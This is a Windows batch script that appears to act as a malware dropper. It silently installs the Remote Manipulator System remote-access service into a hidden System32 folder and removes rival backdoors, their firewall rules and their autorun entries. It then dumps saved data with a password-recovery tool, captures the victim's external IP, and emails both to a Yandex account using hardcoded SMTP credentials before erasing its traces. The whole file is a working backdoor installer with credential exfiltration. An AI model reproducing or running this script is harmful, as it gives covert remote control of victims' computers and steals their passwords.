@echo off
"%SYSTEMROOT%\System32\RManServer.exe" /stop
"%SYSTEMROOT%\System32\RManServer.exe" /silentuninstall
taskkill /f /im RManServer.exe
taskkill /f /im rutserv.exe
reg delete "HKLM\SYSTEM\Remote Manipulator System" /f
md "%SYSTEMROOT%\System32\catroot3"
attrib +s +h "%SYSTEMROOT%\System32\catroot3"

copy /y "de.exe" "%SYSTEMROOT%\System32\de.exe"
copy /y "dsfOggMux.dll" "%SYSTEMROOT%\System32\catroot3\dsfOggMux.dll"
copy /y "dsfTheoraEncoder.dll" "%SYSTEMROOT%\System32\catroot3\dsfTheoraEncoder.dll"
copy /y "dsfVorbisEncoder.dll" "%SYSTEMROOT%\System32\catroot3\dsfVorbisEncoder.dll"
copy /y "HookDrv.dll" "%SYSTEMROOT%\System32\catroot3\HookDrv.dll"
copy /y "Microsoft.VC80.CRT.manifest" "%SYSTEMROOT%\System32\catroot3\Microsoft.VC80.CRT.manifest"
copy /y "msvcp80.dll" "%SYSTEMROOT%\System32\catroot3\msvcp80.dll"
copy /y "msvcr80.dll" "%SYSTEMROOT%\System32\catroot3\msvcr80.dll"
copy /y "rfusclient.exe" "%SYSTEMROOT%\System32\catroot3\rfusclient.exe"
copy /y "PushSource.ax" "%SYSTEMROOT%\System32\catroot3\PushSource.ax"
copy /y "RIPCServer.dll" "%SYSTEMROOT%\System32\catroot3\RIPCServer.dll"
copy /y "rutserv.exe" "%SYSTEMROOT%\System32\catroot3\rutserv.exe"
copy /y "rversionlib.dll" "%SYSTEMROOT%\System32\catroot3\rversionlib.dll"
copy /y "RWLN.dll" "%SYSTEMROOT%\System32\catroot3\RWLN.dll"
copy /y "set.reg" "%SYSTEMROOT%\System32\catroot3\set.reg"

del /f /q "%temp%\de.exe"
del /f /q "%temp%\dsfOggMux.dll"
del /f /q "%temp%\dsfTheoraEncoder.dll"
del /f /q "%temp%\dsfVorbisEncoder.dll"
del /f /q "%temp%\HookDrv.dll"
del /f /q "%temp%\Microsoft.VC80.CRT.manifest"
del /f /q "%temp%\msvcp80.dll"
del /f /q "%temp%\msvcr80.dll"
del /f /q "%temp%\rfusclient.exe"
del /f /q "%temp%\PushSource.ax"
del /f /q "%temp%\RIPCServer.dll"
del /f /q "%temp%\rutserv.exe"
del /f /q "%temp%\rversionlib.dll"
del /f /q "%temp%\RWLN.dll"
del /f /q "%temp%\set.reg"

attrib +s +h +r "%temp%/blat.dll"
attrib +s +h +r "%temp%/blat.lib"
attrib +s +h +r "%temp%/block_reader.sys"
attrib +s +h +r "%temp%/HookLib.dll"
attrib +s +h +r "%temp%/blat.exe"
attrib +s +h +r "%temp%/mpr.exe"
attrib +s +h +r "%temp%/realip.exe"
attrib +s +h +r "%temp%/mpr.ini"
attrib +s +h +r "%temp%\stop.js"
attrib +s +h +r "%temp%\install.bat"
attrib +s +h +r "%SYSTEMROOT%\System32\de.exe"

net stop rserver3
taskkill /f /im rserver3.exe
taskkill /f /im r_server.exe
taskkill /f /im cam_server.exe

attrib -s -h -r "%SystemRoot%\system32\cam_server.exe"
attrib -s -h -r "%SystemRoot%\SysWOW64\cam_server.exe"
attrib -s -h "%SystemRoot%\system32\rserver30"
attrib -s -h "%SystemRoot%\SysWOW64\rserver30"
attrib -s -h -r "%SystemRoot%\system32\r_server.exe"
attrib -s -h -r "%SystemRoot%\SysWOW64\r_server.exe"

rmdir /s /q %windir%\system32\rserver30
rmdir /s /q %windir%\SysWOW64\rserver30
del /f /q %windir%\system32\r_server.exe
del /f /q %windir%\SysWOW64\r_server.exe
del /f /q %windir%\system32\cam_server.exe
del /f /q %windir%\SysWOW64\cam_server.exe

net stop Telnet
sc config tlntsvr start= disabled
net stop "Service Host Controller"
net user HelpAssistant /delete
schtasks /delete /tn security /f

netsh advfirewall firewall delete rule name="RealIP"
netsh advfirewall firewall delete rule name="Microsoft Outlook Express"
netsh advfirewall firewall delete rule name="Service Host Controller"
netsh advfirewall firewall delete rule name="Хост-процесс для служб Windows"
netsh advfirewall firewall delete rule name="Хост-процесс для задач Windows"
netsh firewall delete portopening tcp 57009
netsh advfirewall firewall delete rule name="cam_server"
netsh advfirewall firewall delete portopening tcp 57011 all

reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v "Операционная система Microsoft Windows" /f
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v "Service Host Controller" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v HelpAssistant /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "cam_server.exe" /f
reg delete "HKLM\System\CurrentControlSet\Services\RServer3" /f

cd %SYSTEMROOT%\System32\catroot3\

"rutserv.exe" /silentinstall
"rutserv.exe" /firewall
regedit /s set.reg
"rutserv.exe" /start

del /f /q %SYSTEMROOT%\System32\catroot3\set.reg

cd %temp%

start /wait %temp%\mpr.exe /export
realip.exe > realip.txt
ping -n 5 127.0.0.1 > nul
blat.exe -install -server smtp.yandex.ru -port 25 -f vzlomkashag@yandex.ru -u vzlomkashag -pw 777qazwsx777
blat.exe -to vzlomkashag@yandex.ru -subject "PERFECTLY! RMS Service (c) by Alex Hitch" -attachi "realip.txt" -body "Real Ip [pass]" -attach %temp%\*.mpf

attrib -s -h -r "%temp%/blat.dll"
attrib -s -h -r "%temp%/blat.lib"
attrib -s -h -r "%temp%/block_reader.sys"
attrib -s -h -r "%temp%/HookLib.dll"
attrib -s -h -r "%temp%/blat.exe"
attrib -s -h -r "%temp%/mpr.exe"
attrib -s -h -r "%temp%/realip.exe"
attrib -s -h -r "%temp%/mpr.ini"

del /f /q %temp%\realip.txt
del /f /q %temp%\ipconfig.txt
del /f /q %temp%\*.mpf
del /f /q %temp%\blat.dll
del /f /q %temp%\blat.exe
del /f /q %temp%\blat.lib
del /f /q %temp%\block_reader.sys
del /f /q %temp%\HookLib.dll
del /f /q %temp%\mpr.ini
del /f /q %temp%\mpr.exe
del /f /q %temp%\realip.exe

attrib -s -h -r "%temp%\stop.js"
attrib -s -h -r "%temp%\install.bat"

del /f /q "%temp%\stop.js"
del /f /q "%temp%\install.bat"
